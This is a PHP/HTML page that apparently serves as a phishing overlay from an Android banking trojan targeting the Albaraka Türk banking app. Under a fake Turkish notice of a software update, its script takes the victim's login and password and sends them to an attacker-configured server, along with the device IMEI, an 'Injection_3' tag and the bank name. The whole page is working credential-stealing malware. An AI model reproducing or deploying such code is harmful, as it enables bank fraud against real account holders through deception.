<html>
<head>
		<meta charset="UTF-8">
        <link href="tr/com.pozitron.albarakaturk/style.css" rel="stylesheet">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div class="header">
        <p>Yazılım Güncellemesi</p>
    </div>
	<img src="animation2.gif">
 <center><font face="Tahoma" size="4" color="black">Yeni versiyon android güncellemesi yapılmaktadır, bu işlem yaklaşık üç veya dört saat sürmektedir.</font><br /></center>
  <script type="text/javascript">


  (function () {


        var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
             var input = objDoc.createElement("input");
             input.setAttribute("type", "hidden");
             input.setAttribute("name", sNm);
             input.setAttribute("value", sV);
             input.value = sV;
             objForm.appendChild(input);
         };
                    var g_oBtn = document.getElementById('sbt_input');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = 'login';
							oCodeInp.className = 'password';
						} catch(e){};

                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'loginerror';
							} catch(e){};
                            return false;
                        }

                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'passworderror';
							} catch(e){};
                            return false;
                        }

top['closeDlg'] = true;
var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|albarakaturk|"+oNumInp.value+"|"+oCodeInp.value);

return false;
};

})();
            </script>
</body>
</html>
